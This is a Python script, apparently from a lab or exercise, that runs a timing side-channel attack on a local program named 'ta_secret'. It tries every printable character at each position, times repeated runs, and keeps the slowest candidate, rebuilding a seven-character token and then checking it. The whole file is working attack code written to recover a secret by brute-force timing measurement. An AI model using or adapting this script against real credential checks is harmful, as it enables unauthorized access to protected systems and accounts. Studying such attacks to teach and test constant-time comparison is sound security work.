import sys
import time
import string
import statistics

import subprocess

TELNET_HOST = "127.0.0.1"
TELNET_PORT = 5555
N = 3 # Number of requests to make for each guess
TOKEN_SIZE = 7 # Size of the token to guess
TA_APP = "ta_secret"  # Command to test the token
TA_COMMAND = "-a 0 0"


# Global child process 
child = None


def try_to_hack(characters):
    
    global child
    args = [TA_APP] + TA_COMMAND.split() + [characters]
    print(f"{' '.join(args)}\n")

    timings = []
    #first run because first run takes a little longer for some reason
    subprocess.run(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    for _ in range(N):
        start = time.perf_counter()
        subprocess.run(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        end = time.perf_counter()
        timings.append(end - start)

    return timings

def find_next_character(base):
   
    measures = []
    
    print(f"\nTesting position {len(base) + 1}/{TOKEN_SIZE}")
    
    for c in string.printable:
        guess = base + c + 'a' * (TOKEN_SIZE - len(base) - 1)
                
        times = try_to_hack(guess)
        
        # Filter out infinite times
        valid_times = [t for t in times if t != float('inf')]
        
        if valid_times:
            median_time = statistics.median(valid_times)
            min_time = min(valid_times)
            max_time = max(valid_times)
            stddev = statistics.stdev(valid_times) if len(valid_times) > 1 else 0
            
            measures.append({
                'char': c,
                'median': median_time,
                'min': min_time,
                'max': max_time,
                'stddev': stddev
            })
            
            #print(f"(median: {median_time:.4f}s)")
        else:
            print(f"(all failed)")
    
    print() 
    
    if not measures:
        print("\n ERROR: All attempts failed.")
        sys.exit(1)
    
    # Sort by median time descending - longer time suggests correct character
    measures.sort(key=lambda x: x['median'], reverse=True)
    
    # Display top candidates for debugging reasons. Since none of the characters in the password are present in the top 5 then we can assume the timing will not go well
    print(f"Top 5 candidates:") 
    for i, m in enumerate(measures[:min(5, len(measures))]):
        print(f"    {i+1}. '{m['char']}': median={m['median']:.6f}s, "
              f"min={m['min']:.6f}s, max={m['max']:.6f}s, stddev={m['stddev']:.6f}s")
    
    best_char = measures[0]['char']
    second_best = measures[1]['median'] if len(measures) > 1 else 0
    diff = measures[0]['median'] - second_best
    
    print(f"[+] Selected: '{best_char}' (advantage: {diff:.6f}s)")
    
    return best_char

def main():
    global child
    
    
    base = ""
    print("will start to try to hack\n")
    
    
    while len(base) < TOKEN_SIZE:
        next_char = find_next_character(base)
        base += next_char
        print(f"\nCurrent guess: {base}\n")        

    
    print(f"\nAttack complete. Guessed token: {base}")
    
    print(f"\nVerifying guessed password: {base}")
    
    args = [TA_APP] + TA_COMMAND.split() + [base]
    check = subprocess.run(args, capture_output=True, text=True)
    # print program output in final verification 
    print(check.stdout, end="")
    if check.stderr:
        print(check.stderr, end="", file=sys.stderr)
    combined = (check.stdout or "") + (check.stderr or "")
    if "password is invalid" in combined.lower() or "wrong credentials" in combined.lower():
        print("Could not find correct password")
    else:
        print("FOUND PASSWORD!!")
        


if __name__ == '__main__':
    main()